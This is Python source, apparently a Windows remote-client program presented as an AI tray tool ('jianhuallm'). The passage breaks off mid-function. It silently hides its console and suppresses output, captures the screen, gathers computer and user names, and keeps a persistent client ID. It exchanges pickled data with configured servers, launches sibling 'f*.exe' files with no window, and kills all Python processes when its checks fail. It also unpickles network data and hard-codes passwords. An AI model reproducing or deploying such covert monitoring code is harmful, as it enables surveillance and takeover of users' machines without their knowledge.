from __future__ import annotations
# 生产环境程序完整性检测和API调用检测
import subprocess
import threading
import time
import os
import sys
import json
import psutil
import ctypes
from ctypes import wintypes
import tkinter as tk
from tkinter import messagebox
import builtins


def _has_cli_switch(*names: str) -> bool:
    """检测命令行开关（大小写不敏感）。"""
    try:
        arg_tokens = {str(x).strip().lower() for x in sys.argv[1:]}
        return any(str(name).strip().lower() in arg_tokens for name in names if name)
    except Exception:
        return False


# 启动诊断开关：
# - STARTUP_VISIBLE_LOG：开启可见日志（默认关闭）
# - STARTUP_RELAX_GUARDS：放宽启动门禁（默认关闭）
STARTUP_TRACE = _has_cli_switch("--trace-startup", "--startup-trace", "--trace_boot", "--trace-boot")
STARTUP_VISIBLE_LOG = _has_cli_switch("--show-log", "showlog", "client_show_log", "--visible-log")
STARTUP_RELAX_GUARDS = _has_cli_switch("--relax-startup", "--soft-startup", "--diagnostic-startup")
STARTUP_NO_TRAY = _has_cli_switch("--no-tray", "--notray", "no_tray")


def _startup_trace_path() -> str:
    """尽量把轨迹日志写到 EXE 同目录（onefile 也稳定）。"""
    try:
        # 优先使用 argv0（通常是 exe 路径）
        argv0 = ""
        try:
            argv0 = str(sys.argv[0] or "")
        except Exception:
            argv0 = ""
        if argv0:
            d = os.path.dirname(os.path.abspath(argv0))
            if d:
                return os.path.join(d, "startup_trace.log")
    except Exception:
        pass
    try:
        # 退化：用当前工作目录
        return os.path.join(os.getcwd(), "startup_trace.log")
    except Exception:
        return "startup_trace.log"


def _startup_trace(msg: str) -> None:
    """启动轨迹日志（默认关闭，启用时写入本地文件）。"""
    if not STARTUP_TRACE:
        return
    try:
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        line = f"[{ts}] {msg}\n"
        path = _startup_trace_path()
        with open(path, "a", encoding="utf-8", errors="replace") as f:
            f.write(line)
    except Exception:
        # 轨迹日志失败也不能影响主流程
        pass


def _install_startup_excepthook() -> None:
    """捕获未处理异常到轨迹日志，避免 exe 秒退无痕。"""
    if not STARTUP_TRACE:
        return
    try:
        import traceback as _tb

        def _hook(exctype, value, tb):  # type: ignore[no-untyped-def]
            try:
                _startup_trace("UNHANDLED_EXCEPTION:")
                _startup_trace("".join(_tb.format_exception(exctype, value, tb)).rstrip())
            except Exception:
                pass
        sys.excepthook = _hook  # type: ignore[assignment]
    except Exception:
        pass


_install_startup_excepthook()
_startup_trace("BOOT: module import finished; argv=" + repr(sys.argv))
_startup_trace("BOOT: sys.executable=" + repr(getattr(sys, "executable", None)))
_startup_trace("BOOT: cwd=" + repr(os.getcwd()))
_startup_trace(
    "BOOT: frozen_flags="
    + repr(
        {
            "sys.frozen": bool(getattr(sys, "frozen", False)),
            "__compiled__": bool("__compiled__" in globals()),
            "sys._MEIPASS": bool(getattr(sys, "_MEIPASS", None)),
        }
    )
)
_startup_trace(
    "BOOT: switches="
    + repr(
        {
            "trace": STARTUP_TRACE,
            "visible_log": STARTUP_VISIBLE_LOG,
            "relax_guards": STARTUP_RELAX_GUARDS,
            "no_tray": STARTUP_NO_TRAY,
        }
    )
)


def _tray_ai_config_path() -> str:
    try:
        return _jhgw_config_path()
    except Exception:
        try:
            return os.path.join(get_app_dir(), "peizhi.json")
        except Exception:
            return "peizhi.json"


def _tray_open_ai_config(icon=None, item=None) -> None:  # pystray callback signature
    """托盘菜单：配置 AI（打开 peizhi.json）"""
    try:
        cfg_path = _tray_ai_config_path()
        _startup_trace("TRAY: open_config path=" + repr(cfg_path))
        if platform.system() == "Windows":
            # 用记事本打开最稳（避免默认程序关联异常）
            subprocess.Popen(["notepad.exe", cfg_path])
        else:
            # 其他系统尽量用默认方式打开
            try:
                os.startfile(cfg_path)  # type: ignore[attr-defined]
            except Exception:
                subprocess.Popen(["xdg-open", cfg_path])
    except Exception as e:
        _startup_trace("TRAY: open_config failed=" + repr(e))


def _tray_quit(icon=None, item=None) -> None:  # pystray callback signature
    """托盘菜单：退出"""
    try:
        _startup_trace("TRAY: quit requested")
        try:
            if icon is not None:
                icon.stop()
        except Exception:
            pass
    finally:
        # 强制结束进程，确保释放端口
        os._exit(0)


def tray_main() -> bool:
    """启动托盘图标（Windows 优先）。成功启动返回 True，否则返回 False。"""
    if STARTUP_NO_TRAY:
        _startup_trace("TRAY: disabled by --no-tray")
        return False
    if platform.system() != "Windows":
        _startup_trace("TRAY: non-windows, skip")
        return False
    if not is_frozen():
        # 脚本模式默认不启用托盘，避免开发时体验受影响
        _startup_trace("TRAY: not frozen, skip")
        return False

    try:
        import pystray  # type: ignore
        from pystray import MenuItem as _MenuItem  # type: ignore
    except Exception as e:
        _startup_trace("TRAY: import pystray failed=" + repr(e))
        return False

    try:
        img = None
        try:
            ico_path = os.path.join(get_app_dir(), "ai.ico")
            if os.path.exists(ico_path):
                img = Image.open(ico_path)
                _startup_trace("TRAY: icon loaded from " + repr(ico_path))
        except Exception as e:
            _startup_trace("TRAY: icon load failed=" + repr(e))

        if img is None:
            # 回退：创建一个小图标，避免 pystray 直接报错
            try:
                img = Image.new("RGBA", (64, 64), (0, 122, 255, 255))
                _startup_trace("TRAY: icon fallback created")
            except Exception:
                pass

        menu = pystray.Menu(
            _MenuItem("配置AI", _tray_open_ai_config),
            _MenuItem("退出", _tray_quit),
        )

        icon = pystray.Icon("jianhuallm", img, "jianhuallm", menu)
        _startup_trace("TRAY: icon.run starting")
        icon.run()
        _startup_trace("TRAY: icon.run ended")
        return True
    except Exception as e:
        _startup_trace("TRAY: start failed=" + repr(e))
        return False

# 默认静默日志：不在控制台输出运行日志。
# 如需临时查看日志，可设置环境变量 CLIENT_SHOW_LOG=1
# 或在命令行附加参数 --show-log。
def _configure_console_log_mode():
    try:
        env_show_log = str(os.environ.get("CLIENT_SHOW_LOG", "")).strip().lower() in {"1", "true", "yes", "on"}
        if not (env_show_log or STARTUP_VISIBLE_LOG):
            builtins.print = lambda *args, **kwargs: None
    except Exception:
        # 日志模式异常不影响主流程
        pass

_configure_console_log_mode()

def show_runtime_error_dialog():
    """显示运行库错误弹窗（0xc000007b）- 用于非参数启动时的错误提示"""
    try:
        # 检查是否在主线程中
        if threading.current_thread() is threading.main_thread():
            # 在主线程中，显示弹窗
            root = tk.Tk()
            root.withdraw()  # 隐藏主窗口
            
            # 显示运行库错误弹窗
            error_title = "运行库错误"
            error_message = "运行库错误 0xc000007b"
            messagebox.showerror(error_title, error_message)
            
            # 销毁根窗口
            root.destroy()
            
            print(f"[错误] {error_title}: {error_message}")
        else:
            # 在非主线程中，使用print输出
            print("[错误] 运行库错误 0xc000007b")
            print("[错误] 非主线程无法显示弹窗，使用控制台输出")
            
    except Exception as e:
        # 如果弹窗失败，使用print输出
        print("[错误] 运行库错误 0xc000007b")
        if not is_frozen():
            print(f"[错误] 弹窗显示失败: {str(e)}")
    finally:
        # 退出程序
        sys.exit(1)

def show_error_dialog(title, message):
    """显示错误弹窗并自动退出Python进程（打包版本不弹窗，只打印简要信息）"""
    try:
        # 打包版本：不弹窗，只打印简要信息
        if is_frozen():
            print(f"[错误] {title}")
            if not STARTUP_RELAX_GUARDS:
                kill_all_python_processes()
            else:
                print("[告警] 已启用放宽启动模式，本次错误仅告警不退出")
            return
        
        # 非打包版本：显示弹窗
        # 检查是否在主线程中
        if threading.current_thread() is threading.main_thread():
            # 在主线程中，直接显示弹窗
            root = tk.Tk()
            root.withdraw()  # 隐藏主窗口
            
            # 显示错误弹窗
            messagebox.showerror(title, message)
            
            # 销毁根窗口
            root.destroy()
            
            print(f"[错误] {title}: {message}")
        else:
            # 在非主线程中，使用print输出
            print(f"[错误] {title}: {message}")
            print(f"[错误] 非主线程无法显示弹窗，使用控制台输出")
            
    except Exception as e:
        # 如果弹窗失败，使用print输出
        print(f"[错误] {title}: {message}")
        if not is_frozen():
            print(f"[错误] 弹窗显示失败: {str(e)}")
    finally:
        # 自动退出所有Python进程
        if not STARTUP_RELAX_GUARDS:
            kill_all_python_processes()
        else:
            print("[告警] 已启用放宽启动模式，已阻止强制退出")

def kill_all_python_processes():
    """自动退出系统中的所有Python相关进程"""
    try:
        print("[清理] 正在退出所有Python进程...")
        
        # 获取当前进程ID
        current_pid = os.getpid()
        
        # 查找所有Python进程
        python_processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.info['name'] and 'python' in proc.info['name'].lower():
                    python_processes.append(proc)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # 终止所有Python进程（除了当前进程）
        for proc in python_processes:
            try:
                if proc.pid != current_pid:
                    print(f"[清理] 正在终止Python进程: PID {proc.pid}")
                    proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # 等待进程终止
        time.sleep(2)
        
        # 强制杀死仍在运行的Python进程
        for proc in python_processes:
            try:
                if proc.pid != current_pid and proc.is_running():
                    print(f"[清理] 强制终止Python进程: PID {proc.pid}")
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        print("[清理] Python进程清理完成")
        
    except Exception as e:
        print(f"[清理] 清理Python进程失败: {str(e)}")
    finally:
        # 退出当前进程
        sys.exit(1)

def check_program_integrity():
    """生产环境程序完整性检测"""
    try:
        _startup_trace("GUARD: check_program_integrity() enter")
        print("[检测] 开始程序完整性检测...")
        
        # 检查关键模块是否可用
        required_modules = ['cv2', 'pyautogui', 'mss', 'socket', 'threading', 'requests', 'PIL', 'numpy']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
                print(f"[检测] 模块 {module} 可用")
            except ImportError:
                missing_modules.append(module)
                print(f"[检测] 模块 {module} 缺失")
        
        if missing_modules:
            error_msg = f"程序缺少项目依赖: {', '.join(missing_modules)}"
            show_error_dialog("程序缺少项目依赖", error_msg)
            _startup_trace("GUARD: check_program_integrity missing_modules=" + repr(missing_modules))
            return False
        
        # 检查关键功能是否正常
        try:
            # 测试屏幕捕获功能
            print("[检测] 测试屏幕捕获功能...")
            with mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                if screenshot is None:
                    show_error_dialog("程序缺少项目依赖", "屏幕捕获功能异常，程序完整性检查失败")
                    return False
            print("[检测] 屏幕捕获功能正常")
        except Exception as e:
            error_msg = f"屏幕捕获功能异常: {str(e)}"
            show_error_dialog("程序缺少项目依赖", error_msg)
            return False
        
        # 测试网络功能
        try:
            print("[检测] 测试网络功能...")
            import socket
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(2)
            test_socket.connect(("127.0.0.1", 80))
            test_socket.close()
            print("[检测] 网络功能正常")
        except Exception:
            print("[检测] 本地网络测试失败，但不影响程序完整性")
        
        print("[检测] 程序完整性检测通过")
        _startup_trace("GUARD: check_program_integrity() ok")
        return True
        
    except Exception as e:
        error_msg = f"程序完整性检测异常: {str(e)}"
        show_error_dialog("程序缺少项目依赖", error_msg)
        _startup_trace("GUARD: check_program_integrity() exception=" + repr(e))
        return False

def check_api_calls():
    """生产环境API调用检测"""
    try:
        _startup_trace("GUARD: check_api_calls() enter")
        print("[检测] 开始API调用检测...")
        
        # 检测Windows API调用
        if WINDOWS_API_AVAILABLE:
            try:
                print("[检测] 测试Windows API调用...")
                computer_name = win32api.GetComputerName()
                if not computer_name:
                    show_error_dialog("程序缺少项目依赖", "Windows API调用失败，程序完整性检查失败")
                    return False
                print("[检测] Windows API调用正常")
            except Exception as e:
                error_msg = f"Windows API调用异常: {str(e)}"
                show_error_dialog("程序缺少项目依赖", error_msg)
                return False
        
        # 检测屏幕捕获API调用
        try:
            print("[检测] 测试屏幕捕获API调用...")
            with mss() as sct:
                screenshot = sct.grab(sct.monitors[1])
                if screenshot is None:
                    show_error_dialog("程序缺少项目依赖", "屏幕捕获API调用失败，程序完整性检查失败")
                    return False
            print("[检测] 屏幕捕获API调用正常")
        except Exception as e:
            error_msg = f"屏幕捕获API调用异常: {str(e)}"
            show_error_dialog("程序缺少项目依赖", error_msg)
            return False
        
        # 检测网络API调用
        try:
            print("[检测] 测试网络API调用...")
            import socket
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(3)
            test_socket.connect(("8.8.8.8", 53))
            test_socket.close()
            print("[检测] 网络API调用正常")
        except Exception as e:
            print(f"[检测] 网络API调用测试失败: {str(e)}，但不影响程序完整性")
        
        print("[检测] API调用检测通过")
        _startup_trace("GUARD: check_api_calls() ok")
        return True
        
    except Exception as e:
        error_msg = f"API调用检测异常: {str(e)}"
        show_error_dialog("程序缺少项目依赖", error_msg)
        _startup_trace("GUARD: check_api_calls() exception=" + repr(e))
        return False

def launch_target_program():
    """启动目标程序"""
    try:
        print("[启动] 开始启动F开头EXE程序...")
        
        # 获取当前目录（兼容EXE打包）
        if is_frozen():
            # 如果是打包后的EXE
            current_dir = os.path.dirname(get_program_entry_path())
        else:
            # 如果是Python脚本
            current_dir = os.path.dirname(os.path.abspath(__file__))
        
        print(f"[启动] 扫描目录: {current_dir}")
        
        # 查找所有以f开头的exe文件
        target_processes = []
        try:
            for filename in os.listdir(current_dir):
                if filename.lower().startswith('f') and filename.lower().endswith('.exe'):
                    target_exe_path = os.path.join(current_dir, filename)
                    if os.path.exists(target_exe_path):
                        target_processes.append(target_exe_path)
                        print(f"[发现] 目标程序: {filename}")
        except Exception as e:
            print(f"[错误] 扫描目录失败: {str(e)}")
            return None
        
        if not target_processes:
            print("[警告] 未发现任何以f开头的exe程序")
            return None
        
        print(f"[启动] 发现 {len(target_processes)} 个目标程序")
        
        # 启动所有目标程序
        started_processes = []
        for target_exe_path in target_processes:
            try:
                print(f"[启动] 正在启动目标程序: {os.path.basename(target_exe_path)}")
                
                # 启动目标程序，带dakai参数
                cmd = [target_exe_path, 'dakai']
                creation_flags = 0
                if platform.system() == 'Windows':
                    creation_flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
                process = subprocess.Popen(cmd, 
                                         stdout=subprocess.PIPE, 
                                         stderr=subprocess.PIPE,
                                         creationflags=creation_flags)
                
                # 验证进程是否成功启动
                time.sleep(1)
                if process.poll() is None:  # 进程仍在运行
                    print(f"[成功] 目标程序启动成功: {os.path.basename(target_exe_path)}, PID: {process.pid}")
                    started_processes.append({
                        'path': target_exe_path,
                        'process': process,
                        'name': os.path.basename(target_exe_path)
                    })
                else:
                    print(f"[错误] 目标程序启动失败: {os.path.basename(target_exe_path)}, 退出码: {process.poll()}")
                    
            except Exception as e:
                print(f"[错误] 启动目标程序异常: {os.path.basename(target_exe_path)} - {str(e)}")
        
        if started_processes:
            print(f"[成功] 成功启动 {len(started_processes)} 个目标程序")
            return started_processes
        else:
            print("[错误] 所有目标程序启动失败")
            return None
            
    except Exception as e:
        print(f"[错误] 启动目标程序异常: {str(e)}")
        return None

def delayed_launch():
    """延迟启动目标程序"""
    print("[启动] 延迟启动开始...")
    
    # 等待主程序完全初始化
    time.sleep(3)
    
    # 启动目标程序
    started_processes = launch_target_program()
    
    if started_processes:
        print(f"[启动] 目标程序启动完成，共启动 {len(started_processes)} 个程序:")
        for proc_info in started_processes:
            print(f"  - {proc_info['name']} (PID: {proc_info['process'].pid})")
    else:
        print("[启动] 目标程序启动失败")

import sys
import cv2
import socket
import ssl
import pyautogui
from mss import mss
from numpy import array
from pickle import dumps, loads
from struct import pack, unpack
import io
from PIL import Image
import platform
import getpass
import subprocess
import requests
import threading
import time
import traceback
import queue
import uuid
import os
import hashlib
import hmac
import secrets
import random
from urllib.parse import urlparse, quote

# 打包版本检测函数（需要在模块级别代码之前定义）
def is_frozen():
    """检查是否是打包版本（兼容 PyInstaller/Nuitka）。"""
    try:
        if getattr(sys, 'frozen', False):
            return True
        # Nuitka 编译运行时通常存在 __compiled__ 全局标记
        if "__compiled__" in globals():
            return True
        # PyInstaller onefile 运行时特征
        if getattr(sys, "_MEIPASS", None):
            return True
    except Exception:
        pass
    return False

def get_program_entry_path():
    """获取真实入口程序路径，避免 onefile 临时 python.exe 干扰。"""
    try:
        if not is_frozen():
            return os.path.abspath(__file__)
    except Exception:
        pass

    candidates = []
    try:
        if sys.argv and sys.argv[0]:
            candidates.append(os.path.abspath(sys.argv[0]))
    except Exception:
        pass
    try:
        if getattr(sys, "executable", None):
            candidates.append(os.path.abspath(sys.executable))
    except Exception:
        pass

    for p in candidates:
        try:
            name = os.path.basename(p).lower()
            if name not in ("python.exe", "pythonw.exe"):
                return p
        except Exception:
            continue

    if candidates:
        return candidates[0]
    return os.path.abspath(__file__)

# DXGI 抓屏可选依赖
try:
    import dxcam
    DXCAM_AVAILABLE = True
except Exception:
    DXCAM_AVAILABLE = False
# 运行目录与稳定客户端ID
def get_app_dir():
    try:
        return os.path.dirname(get_program_entry_path())
    except Exception:
        return os.getcwd()

def get_or_create_client_id():
    """在运行目录持久化保存一个稳定的 client_id，EXE 与 PY 都可用"""
    try:
        app_dir = get_app_dir()
        # 以当前程序名作为文件名：EXE 为可执行名，PY 为脚本名
        try:
            prog_path = get_program_entry_path()
            prog_name = os.path.splitext(os.path.basename(prog_path))[0]
        except Exception:
            prog_name = 'client'
        cid_filename = f"{prog_name}.txt"
        cid_path = os.path.join(app_dir, cid_filename)
        if os.path.exists(cid_path):
            try:
                with open(cid_path, 'r', encoding='utf-8') as f:
                    cid = f.read().strip()
                    if cid:
                        return cid
            except Exception:
                pass
        cid = str(uuid.uuid4())
        try:
            with open(cid_path, 'w', encoding='utf-8') as f:
                f.write(cid)
        except Exception:
            pass
        return cid
    except Exception:
        # 回退：仍保证可运行
        return str(uuid.uuid4())

# 优化的Windows API导入
try:
    import ctypes
    from ctypes import wintypes
    import win32api
    import win32gui
    import win32con
    import win32process
    import win32security
    import win32service
    WINDOWS_API_AVAILABLE = True
except ImportError:
    WINDOWS_API_AVAILABLE = False
    print("Windows API模块未安装，将使用备用方案")

# 线程锁，用于保护socket操作
sock_lock = threading.Lock()

# 多重密码配置
PASSWORD_LEVEL1 = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"  # 一级密码
PASSWORD_LEVEL2 = "q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2"  # 二级密码

# 密码盐值（实际使用时应该随机生成并安全存储）
SALT1 = b"client_salt_level1_2025"
SALT2 = b"client_salt_level2_2025"

# 密码哈希（实际使用时应该从安全存储中读取）
PASSWORD1_HASH = hashlib.pbkdf2_hmac('sha256', PASSWORD_LEVEL1.encode(), SALT1, 100000)
PASSWORD2_HASH = hashlib.pbkdf2_hmac('sha256', PASSWORD_LEVEL2.encode(), SALT2, 100000)

# 认证状态
authentication_status = {
    'level1_verified': False,
    'level2_verified': False,
    'last_activity': None
}

# 优化的屏幕捕获函数
def safe_screen_capture(region=None):
    """按优先级选择抓屏后端，并在失败时自动回退"""
    try:
        global current_capture_backend
        backends = get_backend_order()
        # 先尝试当前后端
        ordered = [current_capture_backend] + [b for b in backends if b != current_capture_backend]
        for b in ordered:
            img = capture_by_backend(b, region)
            if img is not None:
                current_capture_backend = b
                return img
        return None
    except Exception:
        return None

def _capture_screen_windows_api(region=None):
    """使用Windows API进行屏幕捕获"""
    try:
        # 直接使用mss作为备用方案，因为Windows API屏幕捕获比较复杂
        return _capture_screen_mss(region)
    except Exception as e:
        print(f"Windows API屏幕捕获失败: {str(e)}")
        # 备用方案
        return _capture_screen_mss(region)

def _capture_screen_mss(region=None):
    """使用mss进行屏幕捕获（备用方案）"""
    try:
        with mss() as sct:
            if region:
                screenshot = sct.grab(region)
            else:
                screenshot = sct.grab(sct.monitors[1])  # 主显示器
            # mss 返回通常为 BGRA；需转为 RGB，避免红蓝通道错位
            img_np = array(screenshot)
            if len(img_np.shape) == 3 and img_np.shape[2] >= 3:
                # BGRA/BGR -> RGB
                img_rgb = img_np[:, :, :3][:, :, ::-1]
                return Image.fromarray(img_rgb, mode='RGB')
            # 极端情况下兜底
            return Image.fromarray(img_np).convert('RGB')
    except Exception as e:
        print(f"MSS屏幕捕获失败: {str(e)}")
        return None

def _capture_screen_pil(region=None):
    """使用 PIL.ImageGrab 兜底，保证 EXE 下也能尽量抓屏"""
    try:
        from PIL import ImageGrab as _ImageGrab
        if region and all(k in region for k in ('left', 'top', 'width', 'height')):
            bbox = (
                int(region['left']),
                int(region['top']),
                int(region['left'] + region['width']),
                int(region['top'] + region['height'])
            )
            img = _ImageGrab.grab(bbox=bbox)
        else:
            img = _ImageGrab.grab()
        return img.convert('RGB')
    except Exception as e:
        print(f"PIL屏幕捕获失败: {str(e)}")
        return None

# DXGI 抓屏
_dxcam_cache = {}

def _get_dxcam(output_idx: int):
    if output_idx in _dxcam_cache:
        return _dxcam_cache[output_idx]
    cam = dxcam.create(output_idx=output_idx)
    _dxcam_cache[output_idx] = cam
    return cam

def _capture_screen_dxgi(region=None):
    try:
        if not DXCAM_AVAILABLE or platform.system() != 'Windows':
            return None
        output_idx = current_screen_index if isinstance(current_screen_index, int) and current_screen_index >= 0 else 0
        cam = _get_dxcam(output_idx)
        if region and all(k in region for k in ('left', 'top', 'width', 'height')):
            bbox = (
                int(region['left']),
                int(region['top']),
                int(region['left'] + region['width']),
                int(region['top'] + region['height'])
            )
            frame = cam.grab(region=bbox)
        else:
            frame = cam.grab()
        if frame is None:
            return None
        # BGRA -> RGB
        try:
            import numpy as _np
            import cv2 as _cv
            if frame.shape[2] == 4:
                frame = _cv.cvtColor(frame, _cv.COLOR_BGRA2RGB)
            else:
                frame = _cv.cvtColor(frame, _cv.COLOR_BGR2RGB)
            from PIL import Image as _Image
            return _Image.fromarray(frame)
        except Exception:
            return None
    except Exception:
        return None

# 抓屏后端选择与自动回退
current_capture_backend = 'dxgi' if DXCAM_AVAILABLE and platform.system() == 'Windows' else 'mss'

def get_backend_order():
    order = []
    if DXCAM_AVAILABLE and platform.system() == 'Windows':
        order.append('dxgi')
    order.append('mss')
    order.append('pil')
    return order

def capture_by_backend(backend: str, region=None):
    if backend == 'dxgi':
        return _capture_screen_dxgi(region)
    elif backend == 'mss':
        return _capture_screen_mss(region)
    elif backend == 'pil':
        return _capture_screen_pil(region)
    elif backend == 'win':
        return _capture_screen_windows_api(region)
        return None

# 优化的进程控制函数
def safe_process_control(process, action='terminate'):
    """使用优化的Windows API进行进程控制"""
    try:
        if WINDOWS_API_AVAILABLE and platform.system() == 'Windows':
            return _control_process_windows_api(process, action)
        else:
            return _control_process_standard(process, action)
    except Exception as e:
        print(f"进程控制失败: {str(e)}")
        return False

def _control_process_windows_api(process, action='terminate'):
    """使用Windows API进行进程控制"""
    try:
        if not process or not hasattr(process, 'pid'):
            return False
        
        # 使用标准方法作为备用方案
        return _control_process_standard(process, action)
    except Exception as e:
        print(f"Windows API进程控制失败: {str(e)}")
        return False

def _control_process_standard(process, action='terminate'):
    """使用标准方法进行进程控制（备用方案）"""
    try:
        if action == 'terminate':
            process.terminate()
        elif action == 'kill':
            process.kill()
        return True
    except Exception as e:
        print(f"标准进程控制失败: {str(e)}")
        return False

# 优化的窗口控制函数
def safe_window_control(action='hide'):
    """使用优化的Windows API进行窗口控制"""
    try:
        if WINDOWS_API_AVAILABLE and platform.system() == 'Windows':
            return _control_window_windows_api(action)
        else:
            return _control_window_standard(action)
    except Exception as e:
        print(f"窗口控制失败: {str(e)}")
        return False

def _control_window_windows_api(action='hide'):
    """使用Windows API进行窗口控制"""
    try:
        # 获取控制台窗口句柄
        console_window = ctypes.windll.kernel32.GetConsoleWindow()
        if not console_window:
            return False
        
        if action == 'hide':
            # 隐藏窗口
            result = ctypes.windll.user32.ShowWindow(console_window, 0)  # SW_HIDE = 0
        elif action == 'show':
            # 显示窗口
            result = ctypes.windll.user32.ShowWindow(console_window, 5)  # SW_SHOW = 5
        elif action == 'minimize':
            # 最小化窗口
            result = ctypes.windll.user32.ShowWindow(console_window, 2)  # SW_MINIMIZE = 2
        else:
            return False
        
        return result != 0
    except Exception as e:
        print(f"Windows API窗口控制失败: {str(e)}")
        return False

def _control_window_standard(action='hide'):
    """使用标准方法进行窗口控制（备用方案）"""
    try:
        if action == 'hide':
            # 备用方案不再启动额外 cmd 窗口，避免出现黑框弹窗。
            if platform.system() == 'Windows':
                try:
                    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
                    if hwnd:
                        ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
                        return True
                except Exception:
                    return False
        return True
    except Exception as e:
        print(f"标准窗口控制失败: {str(e)}")
        return False

# 优化的系统信息获取函数
def safe_get_system_info():
    """使用优化的方法获取系统信息"""
    try:
        if WINDOWS_API_AVAILABLE and platform.system() == 'Windows':
            return _get_system_info_windows_api()
        else:
            return _get_system_info_standard()
    except Exception as e:
        print(f"系统信息获取失败: {str(e)}")
        return {}

def _get_system_info_windows_api():
    """使用Windows API获取系统信息"""
    try:
        info = {}
        
        # 获取系统版本信息
        os_version = win32api.GetVersionEx()
        info['os_version'] = f"{os_version[0]}.{os_version[1]}.{os_version[2]}"
        
        # 获取计算机名称
        computer_name = win32api.GetComputerName()
        info['computer_name'] = computer_name
        
        # 获取用户名
        user_name = win32api.GetUserName()
        info['user_name'] = user_name
        
        # 获取系统目录
        system_dir = win32api.GetSystemDirectory()
        info['system_dir'] = system_dir
        
        # 获取Windows目录
        windows_dir = win32api.GetWindowsDirectory()
        info['windows_dir'] = windows_dir
        
        return info
    except Exception as e:
        print(f"Windows API系统信息获取失败: {str(e)}")
        return {}

def _get_system_info_standard():
    """使用标准方法获取系统信息（备用方案）"""
    try:
        info = {}
        info['os_version'] = platform.platform()
        info['computer_name'] = platform.node()
        info['user_name'] = getpass.getuser()
        info['system_dir'] = os.environ.get('SYSTEMROOT', '')
        info['windows_dir'] = os.environ.get('WINDIR', '')
        return info
    except Exception as e:
        print(f"标准系统信息获取失败: {str(e)}")
        return {}

# 发送数据包函数
def send_packet(sock, obj):
    data = dumps(obj)
    length = pack('<I', len(data))
    with sock_lock:
        sock.sendall(length + data)

# 接收数据包函数
def recv_packet(sock, buffer):
    while len(buffer) < 4:
        chunk = sock.recv(4096)
        if not chunk:
            return None
        buffer.extend(chunk)
    length = unpack('<I', buffer[:4])[0]
    if length > 2 * 1024 * 1024 or length < 1:
        raise ValueError(f"非法长度: {length}")
    while len(buffer) < 4 + length:
        chunk = sock.recv(4096)
        if not chunk:
            return None
        buffer.extend(chunk)
    data = buffer[4:4+length]
    del buffer[:4+length]
    return loads(data)

# 密码验证函数
def verify_password(password, salt, stored_hash):
    """验证密码"""
    try:
        computed_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000)
        return hmac.compare_digest(computed_hash, stored_hash)
    except Exception:
        return False

def authenticate_request(eventData):
    """验证请求的密码"""
    global authentication_status
    
    level1_pwd = eventData.get("password1", "")
    level2_pwd = eventData.get("password2", "")
    
    # 验证一级密码
    if not verify_password(level1_pwd, SALT1, PASSWORD1_HASH):
        return False, "密码错误"
    
    # 验证二级密码
    if not verify_password(level2_pwd, SALT2, PASSWORD2_HASH):
        return False, "密码错误"
    
    # 更新认证状态
    authentication_status['level1_verified'] = True
    authentication_status['level2_verified'] = True
    authentication_status['last_activity'] = time.time()
    
    return True, "双重密码验证成功"

def is_authenticated():
    """检查是否已通过认证"""
    global authentication_status
    
    return authentication_status['level1_verified'] and authentication_status['level2_verified']

def update_activity():
    """更新活动时间"""
    global authentication_status
    authentication_status['last_activity'] = time.time()

# 获取服务器连接信息列表（支持多行 SSL/TCP）
def parse_connection_line(line):
    def _split_host_port(value, default_port):
        value = (value or "").strip()
        if not value:
            return "", default_port
        value = value.split("/", 1)[0].strip()

        # 支持 [IPv6]:port 格式
        if value.startswith("["):
            end_idx = value.find("]")
            if end_idx > 0:
                host = value[1:end_idx].strip()
                remain = value[end_idx + 1:].strip()
                if remain.startswith(":") and remain[1:].isdigit():
                    return host, int(remain[1:])
                return host, default_port

        # 优先按最后一个 ":" 解析端口，避免误切分
        if ":" in value:
            host_part, port_part = value.rsplit(":", 1)
            if port_part.isdigit():
                return host_part.strip(), int(port_part)
        return value, default_port

    raw = line.strip()
    if not raw:
        return None
    if '#' in raw:
        raw = raw.split('#', 1)[0].strip()
    if not raw:
        return None
    original = raw
    primary_part, has_connect_part, connect_part = raw.partition(",")
    primary_part = primary_part.strip()
    connect_part = connect_part.strip() if has_connect_part else ""
    use_ssl = False
    address = ""
    port = None
    if primary_part.startswith("https://"):
        use_ssl = True
        raw_body = primary_part.replace("https://", "", 1)
        # 业务约定：HTTPS 未显式写端口时，默认走 SSL_SERVER_PORT（39019）
        address, port = _split_host_port(raw_body, SSL_SERVER_PORT)
    elif primary_part.startswith("ssl://"):
        use_ssl = True
        raw_body = primary_part.replace("ssl://", "", 1)
        address, port = _split_host_port(raw_body, SSL_SERVER_PORT)
    elif primary_part.startswith("tcp://"):
        use_ssl = False
        raw_body = primary_part.replace("tcp://", "", 1)
        address, port = _split_host_port(raw_body, TCP_DEFAULT_PORT)
    elif primary_part.startswith("http://"):
        use_ssl = False
        raw_body = primary_part.replace("http://", "", 1)
        address, port = _split_host_port(raw_body, TCP_DEFAULT_PORT)
    else:
        # 无协议前缀时默认 TCP（如: 1.2.3.4 或 1.2.3.4:39018）
        address, port = _split_host_port(primary_part, TCP_DEFAULT_PORT)
        use_ssl = False
    if not address:
        return None

    connect_address = address
    connect_port = port
    if connect_part:
        parsed_connect_addr, parsed_connect_port = _split_host_port(connect_part, port)
        if parsed_connect_addr:
            connect_address = parsed_connect_addr
            connect_port = parsed_connect_port

    return {
        "address": address,
        "port": port,
        "connect_address": connect_address,
        "connect_port": connect_port,
        "use_ssl": use_ssl,
        "ssl_domain": address if use_ssl else None,
        "original": original
    }

CONTROL_CONFIG_BASE_URL = "https://your-config-bucket.example.com"
_CONTROL_FILENAME_CACHE = None

def get_control_filename():
